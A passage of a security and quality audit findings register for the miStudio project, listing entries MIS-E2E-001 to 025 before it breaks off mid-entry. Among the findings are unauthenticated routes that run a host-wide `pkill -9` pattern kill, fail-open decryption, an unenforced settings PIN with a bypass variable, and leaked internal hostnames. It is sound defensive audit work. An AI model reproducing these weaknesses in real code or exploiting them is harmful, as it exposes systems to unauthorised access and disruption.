# FINDINGS — miStudio E2E Assessment 2026-08

**The register.** Append-only. One block per finding, stable id `MIS-E2E-###`.
Ids are never reused and never renumbered. A refuted finding is marked
`REFUTED` and stays in place so a later round cannot rediscover it as new.

Schema, severity rubric and verification rules: see [PLAN.md](PLAN.md).

**Count:** 78
**Last id issued:** MIS-E2E-078

---

## Seeded — from the planning scan (2026-08-23)

These were observed while planning the assessment. They are recorded here so no
phase rediscovers them as new. Each carries the phase that owns its verification.

---

### MIS-E2E-001 — Four persona files are a year-stale copy describing a different project
- **Phase / Round:** P00 / seed — **CORRECTED at P01 R1**
- **Source:** planning scan; corrected when `/review` actually ran
- **Severity:** P3 *(downgraded from P2 — see the correction)*
- **Type:** debt
- **Location:** `.claude/agents/{architect,product_engineer,qa_engineer,test_engineer}.md`
- **Claim:** Four files named exactly like the `/review` personas sit in `.claude/agents/`, dated **2025-01-15**, describing a **different project** — Prisma schema, RTK Query, SAML auth middleware, "187 backend tests". None of the four contains the string `miStudio`, `SAE` or `steering`. They are duplicates-by-name of the real personas and have no other purpose.
- **CORRECTION — the original entry was wrong about the impact.** `/review` loads `@.claude/context/agents/*.md`, **not** `.claude/agents/`. That directory holds the real personas and they are **current and excellent**: last updated 2026-08-10, carrying the accumulated J-Lens-arc review lessons (matched-norm control, source-scrape guards failing open, regression tests inheriting their own trap, "confirm the edit LANDED"). `/review` is therefore **not** primed with wrong facts, and the audit workaround planned for it is unnecessary. The seeded entry asserted a consequence it had not checked — recorded here rather than quietly edited, because getting a finding's blast radius wrong is the same class of error the audit is looking for.
- **Failure scenario (what remains):** two sets of same-named persona files, one a year-stale copy of another project's state. `.claude/agents/` is also the real subagent-definition directory (`hardcore-debugger.md` lives there and is a working agent). Anyone globbing `.claude/agents/*.md` — a reasonable guess for "where the agents are" — gets the wrong four, which confidently assert "Security Score: 9/10" and "Error handling: COMPREHENSIVE" about a codebase that is not this one.
- **Evidence:** verified-by-live-repro — `/review` executed and observed loading `.claude/context/agents/`; both directories compared; the stale four grep-negative for every miStudio term
- **Doc reference:** `.claude/commands/review.md` Step 1
- **Verification (R3):** CONFIRMED at P01 R1, with the impact corrected
- **Proposed remediation:** Delete the four files in `.claude/agents/`. They are not referenced by anything and their only effect is to be found by mistake.
- **Effort:** S

### MIS-E2E-002 — No PADR IDL documents the "no application-layer auth" posture
- **Phase / Round:** P00 / seed → P05 owns verification
- **Source:** planning scan
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `backend/src/core/deps.py` (35 lines, supplies only `get_db`); `0xcc/adrs/000_PADR|miStudio.md` (46 IDLs, none on this)
- **Claim:** None of the 270 REST routes has application-layer authentication. Per the assessment's locked decision this is an accepted posture — nginx plus network isolation is the control — but **no IDL states it**, so the posture is indistinguishable from an oversight to the next reader, and nothing constrains where the boundary is allowed to move.
- **Failure scenario:** A future change exposes the backend directly (a new ingress, a port-forward left in a manifest, a developer running compose with the backend port published) and nothing in the document chain says that this is the thing holding the whole security model up. IDL-22 covers path injection and stack-trace exposure but is silent on authn/authz.
- **Evidence:** verified-by-live-repro (`grep -rE "get_current_user|HTTPBearer|Security\(" backend/src/api/` → 0 hits; PADR IDL list read, 46 entries, none on authn)
- **Doc reference:** none — that is the finding
- **Verification (R3):** pending
- **Proposed remediation:** Add a PADR IDL stating the control (nginx as the sole ingress, LAN isolation, the `/api/internal/` HMAC layer as the one in-app exception), its boundary, and what would invalidate it. Note that `SECURITY.md` should agree.
- **Effort:** S

---

### MIS-E2E-003 — Unauthenticated routes run a pattern `pkill -9` and spawn a Celery worker
- **Phase / Round:** P00 / seed → P05
- **Source:** planning scan
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/steering.py:394`, `:625` (pkill); `:433`, `:532` (Popen)
- **Claim:** `POST /steering/reset` and `POST /steering/exit-mode` shell out to `pkill -9 -f steering@` — a *pattern* kill that SIGKILLs any process on the host whose cmdline contains `steering@`, not only workers this app started. `POST /steering/enter-mode` spawns a Celery worker via `subprocess.Popen`.
- **Failure scenario:** Any process on the host whose command line happens to contain `steering@` — another user's shell, an unrelated container sharing the PID namespace, a `grep steering@` in someone's terminal — is SIGKILLed by an HTTP request. Conversely a caller can spawn workers repeatedly to exhaust GPU or memory. Recorded separately from MIS-E2E-002 because process kill and process spawn are privilege operations regardless of who can reach the port.
- **Evidence:** plausible (read-only; the argv is fixed and list-form, so this is not injection — it is over-broad pattern matching plus an unauthenticated privilege operation)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Track spawned worker PIDs and signal those, rather than matching a cmdline pattern; bound worker spawn with an idempotency/concurrency guard.
- **Effort:** M

---

### MIS-E2E-004 — `decrypt_value` fails open on `InvalidTag`
- **Phase / Round:** P00 / seed → P02
- **Source:** planning scan
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/core/encryption.py:61` (function), `:118` (the fail-open return)
- **Claim:** `decrypt_value` catches every exception — including `cryptography.exceptions.InvalidTag`, i.e. authentication failure — logs a warning, and returns the raw stored value as if it were plaintext. AES-GCM was chosen for authenticated encryption; swallowing the auth failure discards the integrity half of it.
- **Failure scenario:** A row whose ciphertext has been tampered with, or whose key has rotated, is returned to the caller as a plaintext credential. Downstream that value is used as an API key or endpoint URL. The caller cannot distinguish "this was never encrypted" (the legacy case the fallback was written for) from "this failed authentication".
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-20 (DB-backed settings with AES-256-GCM)
- **Verification (R3):** pending — mutation control planned in P02 R2
- **Proposed remediation:** Distinguish "not an envelope" (short/undecodable → legacy plaintext, return as-is) from `InvalidTag` (→ raise). Only the former is the legacy case.
- **Effort:** S

---

### MIS-E2E-005 — The Settings PIN is a UI gate that protects nothing
- **Phase / Round:** P00 / seed → P02/P05
- **Source:** planning scan
- **Severity:** P1
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/settings.py:39-105` (the PIN), `:112`, `:138`, `:166`, `:195` (the routes that ignore it)
- **Claim:** The PIN primitive is well built — PBKDF2-SHA256 at 600,000 iterations, random salt, `hmac.compare_digest` verify. But `POST /settings/pin/verify` only returns `{valid: bool}`; `GET /settings`, `GET /settings/{key}`, `PUT /settings`, `PUT /settings/bulk` and `DELETE /settings/{key}` never check it. Separately, `MISTUDIO_BYPASS_PIN` lets `POST /settings/pin/set` change the PIN without knowing the current one, and advertises itself through `GET /settings/pin/status`.
- **Failure scenario:** Anything that can reach the API reads and writes every setting — including the encrypted API-key rows — without the PIN. The UI shows a locked gate over an unlocked door, which is worse than no gate because it communicates a protection that is not there.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-25 (Settings Panel PIN Protection)
- **Verification (R3):** pending — live repro against k8s planned
- **Proposed remediation:** Enforce the PIN server-side on the settings routes (a short-lived token issued by `/pin/verify`), or amend IDL-25 to state explicitly that the PIN is a UI affordance and not an access control.
- **Effort:** M

---

### MIS-E2E-006 — The hardened path resolver has exactly one production caller
- **Phase / Round:** P00 / seed → P02
- **Source:** planning scan
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/core/config.py:404-464` (`resolve_user_path`), `:362-395` (`resolve_data_path`); the sole caller is `backend/src/services/sae_manager_service.py:543`
- **Claim:** `resolve_user_path` is carefully built — pure-string `normpath` so it never touches the filesystem with raw user data, then allow-list `commonpath` containment against three realpath'd roots. It is called from one place. Every other path in the backend goes through `resolve_data_path`, which performs no containment check and returns an arbitrary absolute path if it exists.
- **Failure scenario:** The trust boundary rests entirely on each caller correctly classifying its input as DB-sourced vs user-supplied. One misclassification — a path that arrives from a request body and is treated as DB-sourced — reaches `resolve_data_path` and escapes the data root. There is no type-level or naming distinction to make that mistake visible in review.
- **Evidence:** verified-by-live-repro (call-site grep)
- **Doc reference:** PADR IDL-22 (Security Hardening — Path Injection)
- **Verification (R3):** pending
- **Proposed remediation:** Audit every `resolve_data_path` call site for user-reachable input; consider a distinct type for untrusted paths so the classification is checked by the compiler rather than by memory.
- **Effort:** M

---

### MIS-E2E-007 — `aaaa/` publishes the dev-internal doc chain to the public mirror
- **Phase / Round:** P00 / seed → P10
- **Source:** planning scan
- **Severity:** P2
- **Type:** security
- **Location:** `aaaa/` (tracked, 12+ files); `.github/workflows/sync-to-clean.yml:27-45`
- **Claim:** `aaaa/` is a tracked duplicate of the `0xcc` document chain — it contains `000_PADR|miStudio.md`, `000_PPRD|miStudio.md`, several FPRD/FTDD/FTASKS files and a `00_MANIFEST.md`. The `sync-to-clean` workflow removes `0xcc/`, `.claude/`, `CLAUDE.md`, `backups/` and `scripts/` before force-pushing to the public `hitsainet/miStudio` repo — but it does not remove `aaaa/`. So the material the filter exists to withhold is published anyway, through a copy.
- **Failure scenario:** Internal architecture decisions, business requirements and roadmap are readable in the public repo. Worse, they are a *stale* copy, so the public repo carries out-of-date internal docs with no indication they are superseded.
- **Evidence:** verified-by-live-repro (`git ls-files aaaa | head` returns tracked files; the workflow's `rm -rf` list read at `sync-to-clean.yml:30-45` has no `aaaa` entry)
- **Doc reference:** none
- **Verification (R3):** pending — confirm against the public repo's actual contents
- **Proposed remediation:** Delete `aaaa/` (it is a duplicate, not a source), and add a guard test asserting the sync filter's exclusion list covers everything matching the doc-chain filename pattern, so the next copy cannot slip through either.
- **Effort:** S

---

### MIS-E2E-008 — Five database dumps are committed to git history
- **Phase / Round:** P00 / seed → P10
- **Source:** planning scan
- **Severity:** P2
- **Type:** security
- **Location:** `backups/mistudio_db_20251218_*.sql.gz` (5 files, 104 KB total, tracked)
- **Claim:** Five gzipped PostgreSQL dumps are committed. The `sync-to-clean` filter does strip `backups/` from the public mirror, so they are not currently published — but they are in this repo's history permanently, and the protection is one line of a workflow away from lapsing.
- **Failure scenario:** The dumps carry whatever was in the database on 2025-12-18 — settings rows (including encrypted API-key ciphertext and its envelope), dataset and model paths, and any user-entered prompt text. A repo history is not a secret store; anyone with clone access has them, and removing them later requires a history rewrite.
- **Evidence:** verified-by-live-repro (`git ls-files backups` → 5 files)
- **Doc reference:** none
- **Verification (R3):** pending — inspect one dump for settings/prompt content to fix the severity
- **Proposed remediation:** `git rm` them, add `backups/` to `.gitignore`, and decide whether a history rewrite is warranted based on what the dumps actually contain.
- **Effort:** S (removal) / L (history rewrite, if warranted)

---

### MIS-E2E-009 — Internal hostnames and a private IP are hardcoded in shipped frontend source
- **Phase / Round:** P00 / seed → P08
- **Source:** planning scan
- **Severity:** P3
- **Type:** security
- **Location:** `frontend/src/components/panels/SettingsPanel.tsx:480`, `:547`, `:583`; `frontend/src/components/labeling/StartLabelingButton.tsx:196`; `frontend/vite.config.ts` (`allowedHosts`)
- **Claim:** UI defaults and placeholders bake in `http://millm-backend.millm.svc.cluster.local:8000/v1`, `http://k8s-millm.hitsai.local`, the private IP `http://192.168.244.61:8001/v1`, and `http://mistudio.hitsai.local/ollama/v1`. These ship in a repo that is publicly mirrored, and production sourcemaps are on (see MIS-E2E-020), so they are readable in the deployed bundle too.
- **Failure scenario:** Internal network topology — a k8s service DNS name, a namespace, a private IP and port — is disclosed to anyone reading the public repo or the shipped bundle. Not exploitable alone; useful to someone who is already inside.
- **Evidence:** verified-by-live-repro (line-level grep)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Move to build-time env (`import.meta.env`) with neutral placeholders in source.
- **Effort:** S

---

### MIS-E2E-010 — `CLAUDE.md` and `/review` reference two files that do not exist
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `CLAUDE.md` ("Quick Resume Commands", "Context Recovery") cites `0xcc/session_state.json`; `.claude/commands/review.md:57` cites `.claude/context/health/dashboard.md`
- **Claim:** Neither file exists. `CLAUDE.md` tells a resuming session that `session_state.json` "is automatically loaded"; `/review` Step 5 instructs the reviewer to update a health dashboard that was never created (only `assessment_template.md` is present in that directory).
- **Failure scenario:** A resuming session follows the documented recovery procedure and silently gets nothing, believing it has loaded state. `/review` Step 5 either fails or is skipped, so the health-impact step of every review has been a no-op.
- **Evidence:** verified-by-live-repro (`ls` on both paths)
- **Doc reference:** self
- **Verification (R3):** pending
- **Proposed remediation:** Create the two files or remove the references. `CLAUDE.md` also references `0xcc/transcripts/`, `0xcc/checkpoints/` and `0xcc/project-specs/` in its folder-structure diagram — none of the three exists either; fold that into the same fix.
- **Effort:** S

---

### MIS-E2E-011 — The PPRD status column contradicts the task lists
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P2
- **Type:** doc-drift
- **Location:** `0xcc/prds/000_PPRD|miStudio.md` §2.1 rows 19, 21, 22, 23, 24, 27; the corresponding `0xcc/tasks/0{18,20,21,22,23,26}_FTASKS|*.md`
- **Claim:** The PPRD inventory is the stated authority on product feature status and disagrees with the task lists in both directions. Rows 22/23/24 read "Planned" while FTASKS 021 is 40/41 done and FTASKS 023 is 35/35. Row 27 reads "Planned" while FTASKS 026 is 16/16. Row 21 reads "Implemented" while FTASKS 020 carries a `[~]` "Hardware acceptance outstanding". Row 19 reads "Planned" and FTASKS 018 is 0/11 — consistent — yet three full review rounds exist for feature 018.
- **Failure scenario:** The PPRD is the document a new session or a stakeholder reads to learn what exists. It currently understates shipped work and cannot be used to decide what to build next. Feature 018 is the sharp case: 68 KB of review records against a task list where nothing is checked, so either the reviews reviewed unmarked-but-shipped code or the task file was abandoned — and the documents cannot tell you which.
- **Evidence:** verified-by-live-repro (checkbox counts per file)
- **Doc reference:** self
- **Verification (R3):** pending — resolve each row against the code, not against the other document
- **Proposed remediation:** Reconcile row by row against shipped code; then decide which document is authoritative for status and make the other derive from it.
- **Effort:** M

---

### MIS-E2E-012 — 193 open tasks sit in files with no `## Relevant Files` section
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P2
- **Type:** debt
- **Location:** `0xcc/tasks/{IMPL_Celery_Steering_Migration,BUGFIX_TASKS|MultiSAE_Import,UI_TASKS|Feature_Browser_Range_Filtering,DOCS_TASKS|Documentation_Update_Jan2025,UI_TASKS|Labeling_Template_Variable_Insertion,SUPP_TASKS|BPE_Token_Reassembly_Fix}.md`; also FTASKS 024–028
- **Claim:** 348 task boxes are unchecked repo-wide. 193 of them — more than the entire numbered feature chain's 155 — are in six ad-hoc files, none of which has the `## Relevant Files` section the framework requires. `IMPL_Celery_Steering_Migration.md` alone is 32,859 bytes with 61 open and 0 done, while PADR IDL-13 and the session log both describe the steering async migration as having shipped.
- **Failure scenario:** `## Relevant Files` is the framework's documented doc→code join key. Without it there is no way to tell from the documents whether this work shipped, was abandoned, or is outstanding — which is exactly the state `IMPL_Celery_Steering_Migration` is in. Five FTASKS files (024–028) have the same gap.
- **Evidence:** verified-by-live-repro (per-file checkbox and section counts)
- **Doc reference:** `0xcc/instruct/008_process-task-list.md` (Relevant Files is required and maintained)
- **Verification (R3):** pending
- **Proposed remediation:** Triage each ad-hoc file: close it as shipped, delete it as abandoned, or add `## Relevant Files` and keep it. Start with the Celery steering migration, whose status is contradicted by the ADR.
- **Effort:** M

---

### MIS-E2E-013 — Nine features have never been reviewed
- **Phase / Round:** P00 / seed → P11
- **Source:** planning scan
- **Severity:** P2
- **Type:** debt
- **Location:** features 010, 011, 019, 020, 024, 025, 026, 027, 028
- **Claim:** `0xcc/reviews/` is a single batch from 2026-07-11 covering 001–009 only. `.claude/context/sessions/` adds 012–018 and the J-Lens arc. Nine features have no review record of any kind — including 010 (MCP Server, 68 tasks done) and 020 (Checkpoint Lifecycle, which shipped destructive checkpoint pruning).
- **Failure scenario:** The assessment itself is the mitigation, but the gap is worth recording: these nine are where an unreviewed defect is most likely, and P01–P12 should weight effort toward the code they own.
- **Evidence:** verified-by-live-repro (review file inventory cross-referenced against the feature list)
- **Doc reference:** `0xcc/reviews/000_SYNTHESIS.md` scope
- **Verification (R3):** pending
- **Proposed remediation:** Covered by this assessment. Afterwards, record which phase covered each previously-unreviewed feature so the gap does not silently reopen.
- **Effort:** —

---

### MIS-E2E-014 — A second, parallel Socket.IO client exists
- **Phase / Round:** P00 / seed → P09
- **Source:** planning scan
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/api/websocket.ts` (173 lines) vs `frontend/src/contexts/WebSocketContext.tsx` (247 lines)
- **Claim:** Two independent Socket.IO layers exist. The context is the live one — single connection, `transports: ['polling','websocket']`, re-subscribes all channels on reconnect, queues calls made before the socket is ready. `api/websocket.ts` is a separate `WebSocketClient` singleton with its own `io()` call, `transports: ['websocket']` only, and hand-rolled `subscribeToDatasetProgress` / `TrainingProgress` / `TrainingCheckpoints` / `LabelingResults`. It has no test file.
- **Failure scenario:** If anything imports it, the app opens a second connection with different transport settings and a different subscription registry — so a channel subscribed through one layer receives nothing emitted to the other, and the reconnect re-subscription logic that only the context has does not apply. Silent divergence, not a crash.
- **Evidence:** plausible (read-only; import graph not yet traced — P09 R1 must establish whether it is genuinely dead)
- **Doc reference:** PADR IDL-1, IDL-12
- **Verification (R3):** pending
- **Proposed remediation:** If dead, delete it. If live, fold its four helpers into the context.
- **Effort:** S

---

### MIS-E2E-015 — ~19,000 backend service lines have no matching test file
- **Phase / Round:** P00 / seed → P02/P05
- **Source:** planning scan
- **Severity:** P2
- **Type:** test-gap
- **Location:** 29 of 76 modules in `backend/src/services/`; 11 of 25 in `backend/src/api/v1/endpoints/`; 3 of 8 in `backend/src/ml/`
- **Claim:** By filename matching, roughly 19,000 lines of service code have no test file named for them — led by `steering_service.py` (2,993, the largest file in the repo), `extraction_service.py` (2,116), `jlens_acquire_service.py` (1,180), `nlp_analysis_service.py` (1,109), `circuit_capture_service.py` (1,075) and `neuronpedia_local_service.py` (1,043). On the endpoint side `features.py` (1,095 lines, 21 routes) is the largest unmatched. In `ml/`, `community_format.py` (1,233) — the SAE interop format — is unmatched.
- **Failure scenario:** Filename matching over-credits (a module may be exercised by a test named for something else) and under-credits (indirect coverage), so this is a triage list, not a verdict. It tells the assessment where mutation controls will pay: a load-bearing line in a module with no test named for it is the highest-probability surviving mutation.
- **Evidence:** verified-by-live-repro (filename cross-match), but the *conclusion* is plausible until mutations run
- **Doc reference:** PADR testing standards (>80% coverage target)
- **Verification (R3):** pending — resolved per-module by the phase's mutation pass
- **Proposed remediation:** Per-module, driven by which mutations survive rather than by the line count.
- **Effort:** L

---

### MIS-E2E-016 — Frontend test coverage is absent across whole layers
- **Phase / Round:** P00 / seed → P07/P08
- **Source:** planning scan
- **Severity:** P2
- **Type:** test-gap
- **Location:** `frontend/src/{stores,hooks,api,utils,components}/`
- **Claim:** 11 of 20 stores, 11 of 17 panels, 17 of 19 hooks, 18 of 22 API modules and 8 of 13 utils have no test file. `SettingsPanel.tsx` (1,368 lines) and `labelingStore.ts` (667) are untested. `WebSocketContext.tsx` (247 lines) has no direct test and is exercised only incidentally through `renderWithProviders`. No test files exist at all under `components/{circuits,extraction,extractionTemplates,featureGroups,labeling,saes,trainingTemplates}/`.
- **Failure scenario:** As above — this is where mutations will survive. The WebSocket context is the sharpest case: it is the single connection every realtime feature depends on, its reconnect re-subscription is the logic that a past bug lived in, and nothing tests it directly.
- **Evidence:** verified-by-live-repro (file inventory)
- **Doc reference:** PADR testing standards
- **Verification (R3):** pending
- **Proposed remediation:** Prioritise by mutation survival, starting with `WebSocketContext.tsx`.
- **Effort:** L

---

### MIS-E2E-017 — The MCP server's own instructions misstate its tool count
- **Phase / Round:** P00 / seed → P06
- **Source:** planning scan
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `backend/src/mcp_server/server.py:32` (`SERVER_INSTRUCTIONS`); `backend/src/mcp_server/contract.py:9`
- **Claim:** `SERVER_INSTRUCTIONS` — the text served to every connecting agent — says "92 tools across 13 categories". The registry defines 117 tools across 14 categories (83 across 9 enabled by default). `contract.py:9` says "the 58 native tools"; there are 85. The generated contract computes its count dynamically (`contract.py:171`), so only the prose is wrong.
- **Failure scenario:** An agent reads the server's own instructions to decide what is available. The number is a statement the server makes about itself and it is wrong by 25 tools; the category count is wrong by one, which matters because categories are the gating unit. Low blast radius, but it is the server lying about its own surface — and this repo has already shipped 16 tools that existed in the docs and not in the registry.
- **Evidence:** verified-by-live-repro (registry counted per module against `CATEGORY_MODULES` + `MILLM_CATEGORY_MODULES`)
- **Doc reference:** `docs/mcp-contract.md`
- **Verification (R3):** **CONFIRMED at baseline against the live k8s MCP server** (`http://mcp-mistudio.hitsai.local/mcp`). `mistudio_howto(topic='tools')`, which derives from the live registry, reports `tool_count: 116` across **14** categories: admin 2, circuits 24, experiments 3, groups 6, jlens 19, jobs 1, labeling 3, millm_circuits 16, millm_clusters 6, millm_runtime 5, millm_sensing 5, profiles 4, read 12, steering 10. (116 not 117 because `get_approval_status` registers only under `MCP_STEERING_APPROVAL=true`, which is off in this deployment.) The prose says 92/13.
- **Also drifted:** `mistudio_howto(topic='tool_map')` repeats the same wrong number — *"the server instructions named 17 of 92 tools"* — and states **"CIRCUITS ... (`circuits`, 19 tools)"** where the live registry has **24**. So the number is wrong in three places, and the one place it is right (`topic='tools'`) is the one that derives it from the registry instead of restating it.
- **Proposed remediation:** Derive both strings from the registry at build time, the way `contract.py:171` already does, so the prose cannot drift again.
- **Effort:** S

---

### MIS-E2E-018 — Two comments give opposite accounts of who handles CORS
- **Phase / Round:** P00 / seed → P09/P05
- **Source:** planning scan
- **Severity:** P3
- **Type:** doc-drift
- **Location:** `backend/src/core/websocket.py:15` vs `backend/src/main.py:85-86`
- **Claim:** `main.py` deliberately installs no `CORSMiddleware` and says so: CORS is nginx's job, and adding it here would duplicate headers. `core/websocket.py:15` states that CORS *is* handled by `CORSMiddleware` in `main.py`. One of the two is what a future reader will act on.
- **Failure scenario:** A developer debugging a CORS failure reads `websocket.py`, looks for the middleware in `main.py`, does not find it, and adds one — reintroducing the duplicate-header bug the comment in `main.py` exists to prevent.
- **Evidence:** verified-by-live-repro (both comments read)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Correct `websocket.py:15`.
- **Effort:** S

---

### MIS-E2E-019 — A second FastAPI app ships in the tree, unwired
- **Phase / Round:** P00 / seed → P02
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/services/ollm_server/` (1,221 lines: `inference.py` 642, `main.py` 352, `models.py` 161, `config.py` 51)
- **Claim:** A complete second FastAPI application lives beside `src/`, is not referenced by `src/api/v1/router.py`, and installs its own `CORSMiddleware(allow_origins=settings.allowed_origins)` — the only CORS middleware anywhere in the backend, in the one app that is not wired up.
- **Failure scenario:** Dead code that looks live. It is inside the Docker build context and shares `src/core/config.py`, so it inherits configuration changes without inheriting review. If `allowed_origins` is ever `["*"]` alongside credentials, the finding upgrades.
- **Evidence:** verified-by-live-repro (no import path from the router)
- **Doc reference:** none — no IDL or FPRD mentions it
- **Verification (R3):** pending — establish whether anything runs it (a compose service, a Dockerfile entrypoint, a k8s command)
- **Proposed remediation:** Delete it, or document it and bring it under test.
- **Effort:** S

---

### MIS-E2E-020 — Production sourcemaps and 519 console calls ship to the browser
- **Phase / Round:** P00 / seed → P08
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `frontend/vite.config.ts` (`build.sourcemap: true`); 519 `console.log|warn|error` calls in non-test source
- **Claim:** The production build emits full sourcemaps, and no console stripping is configured, so all 519 logging calls run in the deployed app — including `stores/datasetsStore.ts:82`, which logs an access token's length.
- **Failure scenario:** The shipped bundle is fully readable source (compounding MIS-E2E-009), and the console carries operational detail — channel names, ids, a token-shaped length signal — to anyone with devtools open.
- **Evidence:** verified-by-live-repro (config read; occurrence count)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Turn sourcemaps off for production or upload them privately; strip `console.log`/`debug` at build and keep `warn`/`error`.
- **Effort:** S

---

### MIS-E2E-021 — The type-check and lint gates have holes
- **Phase / Round:** P00 / seed → P07
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `frontend/tsconfig.json` (`exclude` covers test files), `frontend/package.json` (no `format:check`), `frontend/eslint.config.js` (`no-explicit-any: 'warn'`), `frontend/vite.config.ts` (no coverage block)
- **Claim:** `npm run type-check` and `npm run build` do not type-check test files — `tsconfig.test.json` exists but no script references it. There is a `format` script but no `--check` counterpart, so formatting is unverifiable in CI. `no-explicit-any` is a warning, so the 172 `any`s in production code (403 including tests) never fail lint. `@vitest/coverage-v8` is installed but no coverage block or threshold is configured.
- **Failure scenario:** Four quality gates that appear to exist do not bite. The `any` concentration matters most: it clusters at the WebSocket payload boundary (`WebSocketContext.on` takes `(...args: any[])`), so every realtime payload enters the app untyped — the exact boundary where P09's payload findings will live.
- **Evidence:** verified-by-live-repro (config files read; occurrence counts)
- **Doc reference:** PADR coding standards (TypeScript strict, ESLint Airbnb)
- **Verification (R3):** pending
- **Proposed remediation:** Add `type-check:test`, `format:check`, coverage thresholds; raise `no-explicit-any` to error with a ratchet.
- **Effort:** M

---

### MIS-E2E-022 — Unowned migration-audit scripts and non-hex revision ids
- **Phase / Round:** P00 / seed → P01
- **Source:** planning scan
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/{audit_migrations.py,check_migrations.py,check_type_mismatches.py,find_column_gaps.py}`; `backend/alembic/versions/` (98 revisions)
- **Claim:** Four standalone migration-audit scripts sit at the backend root with no caller in CI or the test suite. Separately, two revision-id conventions coexist: real hex hashes and hand-written sequential ids, some of which (`g3h4i5j6k7l8`) are not valid hex.
- **Failure scenario:** The scripts encode real knowledge about schema drift and nothing runs them, so their findings never surface. The id convention breaks any tooling that assumes alembic ids are hex — the four scripts above being the likely first casualties.
- **Evidence:** verified-by-live-repro (single head `c7e2a4f18b93` confirmed and guarded by `test_alembic_single_head.py`; id patterns read)
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** pending — run each script and record what it reports
- **Proposed remediation:** Either wire the useful checks into CI or the suite, or delete them.
- **Effort:** S

---

## Phase 0 — Baseline round

---

### MIS-E2E-023 — `ReadoutGrid` calls two hooks after an early return
- **Phase / Round:** P00 / baseline
- **Source:** eslint baseline (`react-hooks/rules-of-hooks`)
- **Severity:** P1
- **Type:** bug
- **Location:** `frontend/src/components/jlens/ReadoutGrid.tsx:87` (early return), `:111` and `:136` (the two `useMemo` calls after it)
- **Claim:** `ReadoutGrid` returns early — `if (axis.length === 0 || tokens.length === 0) return <p>This readout carries no layers for the selected lens.</p>` — and then calls `useMemo` twice further down (`firstDisagreement`, `logitRowOf`). React requires the same hooks in the same order on every render.
- **Failure scenario:** The component renders once with a non-empty axis, registering 2 hooks. The user then switches the lens type to one whose artifact covers no layers — the exact case the empty-state message and the surrounding comments ("a partial artifact reports only the layers it was fitted for", "the two axes are independent now") were written for. `axis` is derived at `JLensPanel.tsx:159` as `useMemo(() => axisFor(meta, readType), [meta, readType])`, so changing `readType` changes `axis` **without unmounting `ReadoutGrid`** — the component is rendered unconditionally at `JLensPanel.tsx:736`. On that render React sees 0 hooks where it saw 2 and throws *"Rendered fewer hooks than expected"*, crashing the J-Lens panel instead of showing the empty-state message it was supposed to show.
- **Evidence:** plausible (read-only) — the rule violation is verified by eslint and by reading; the *crash* is reasoned from the mount path, not yet reproduced
- **Doc reference:** 023_FPRD|JLens_Readout_Viewer; PADR IDL-40
- **Verification (R3):** pending — reproduce in P08 R3 by loading a readout on the live app and switching lens type to one with no fitted layers
- **Proposed remediation:** Move the early return below both `useMemo` calls (they are cheap and both already guard their own inputs), or lift the empty check into `JLensPanel` so the grid is not mounted at all when there is nothing to draw.
- **Effort:** S
- **Note:** this file passed three review rounds and 15 mutation controls in the J-Lens enhancement arc (2026-08-10). `npm run lint` has been reporting it the whole time — nothing runs lint as a gate (see MIS-E2E-024).

---

### MIS-E2E-024 — `npm run lint` fails on `main` and nothing gates on it
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P2
- **Type:** debt
- **Location:** `frontend/` — `npx eslint .` exits 1 with **34 errors / 494 warnings**; `.github/workflows/frontend-ci.yml`
- **Claim:** Lint is red on a clean `main` and has been for long enough that a Rules-of-Hooks violation (MIS-E2E-023) sat in shipped code through a three-round review. Errors by rule: `no-unused-vars` 15, `no-unsafe-function-type` 5, `no-useless-catch` 3, `no-useless-escape` 3, `no-constant-binary-expression` 2, **`react-hooks/rules-of-hooks` 2**, `no-require-imports` 2, `no-array-constructor` 1, `prefer-const` 1.
- **Failure scenario:** The one error class that is a genuine runtime bug is buried in 33 others and 494 warnings, so nobody reads the output. A gate that is always red is not a gate.
- **Evidence:** verified-by-live-repro (`npx eslint .` on clean `main`, exit 1)
- **Doc reference:** PADR coding standards (ESLint Airbnb); `CLAUDE.md` "Before Any Commit" checklist
- **Verification (R3):** CONFIRMED at baseline — `.github/workflows/frontend-ci.yml` runs `type-check`, `build` and `test`, and **never runs `npm run lint`**. That is why the suite is green in CI while lint is red locally: nothing anywhere gates on it.
- **Proposed remediation:** Fix the 34 errors, then make lint blocking in CI. Ratchet the warnings separately (see MIS-E2E-021).
- **Effort:** M
- **Refuted sub-item:** the two `no-constant-binary-expression` errors are **not** defects. `ProgressBar.test.tsx:387` and `StatusBadge.test.tsx:294` deliberately rerender with a literal `{false && <Component/>}` to assert the element unmounts. The assertion is real; only the lint rule is wrong about it. Recorded so a later round does not re-raise them.

---

### MIS-E2E-025 — CI excludes 329 frontend tests that all pass
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P1
- **Type:** test-gap
- **Location:** `.github/workflows/frontend-ci.yml:44-60`
